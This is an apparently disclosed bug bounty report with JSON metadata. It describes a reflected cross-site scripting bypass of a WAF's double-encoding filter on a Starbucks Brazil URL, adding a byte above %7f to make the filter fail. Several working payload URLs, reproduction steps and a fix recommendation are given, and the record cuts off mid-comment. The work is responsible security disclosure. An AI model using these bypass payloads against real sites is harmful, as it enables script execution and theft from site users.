After a while I found out that the previously reported issue was not properly resolved as I was able to bypass the double encoding filter.\n\nThe original payload on the report was something like this:\n```\nhttps://www.starbucks.com.br/testing%2522%2520accesskey='x'%2520onclick='confirm%601%60'\n```\nand it got resolved. But you can bypass the filter with this:\n```\nhttps://www.starbucks.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'\n```\nNotice the `%80` between `%2522` and `%2520`. In fact, you can replace the `%80` with any hex value __beyond `%7f`__  and the payload still works (there's a couple of exceptions throwing \"Bad Request\" errors:  `%81`, `%8d`, `%8f`, `%90`, and `%9d`), but values in the range `%00-%7f` get properly filtered out (throwing custom \"Server Error\" pages and 404 pages, 301 and 302 redirect pages, and default 400 Bad Request errors, depending on the value)\n\nSo, this payload works:\n```\nhttps://www.starbucks.com.br/testing%2522%FF%2520accesskey='x'%2520onclick='confirm%601%60'\n```\nbut this one doesn't:\n```\nhttps://www.starbucks.com.br/testing%2522%7F%2520accesskey='x'%2520onclick='confirm%601%60'\n```\n\nThere is a similar behaviour if you put the double-hex digit first.\nThis payload breaks the filter:\n```\nhttps://www.starbucks.com.br/testing%80%2522%2520accesskey='x'%2520onclick='confirm%601%60'\n```\nbut this one doesn't:\n```\nhttps://www.starbucks.com.br/testing%7F%2522%2520accesskey='x'%2520onclick='confirm%601%60'\n```\n\n**Platform(s) Affected:** Firefox 69.0.3\n\n## Steps To Reproduce:\n\n  1. Visit this link on Firefox: \n\n```\nhttps://www.starbucks.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'\n```\n\n  2. Press CONTROL+ALT+X on Mac, or ALT+SHIFT+X on Windows\n\n## Recommendations for fix\nThe range of hex values `%80-%FF` is breaking the WAF filter, those values need to be filtered out just like the range `%00-%7F` is being filtered out.\n\n## Impact\n\nAs the original report said:\n\"JavaScript is against Starbucks users on multiple critical domains. JavaScript execution results in information theft and an attacker can perform unwanted actions on a victim's behalf\".","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-02-16T18:57:43.542Z","allow_singular_disclosure_after":-52086132.79834499,"singular_disclosure_allowed":true,"vote_count":54,"voters":["secator","base_64","sh1yo","stealthy","ms-13","sensoyard","brodie_codie","javo","kiriknik","mocr7","and 44 more..."],"severity":{"rating":"low","score":3.8,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":13017,"asset_type":"URL","asset_identifier":"www.starbucks.co.uk","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6070575,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-10-18T07:42:17.926Z","updated_at":"2019-10-18T07:42:17.926Z","additional_data":{"old_severity":"Low","new_severity":"Low (3.8)","old_severity_id":541490,"new_severity_id":541783},"actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6070602,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your submission,\n\nThis appears to be a valid finding.
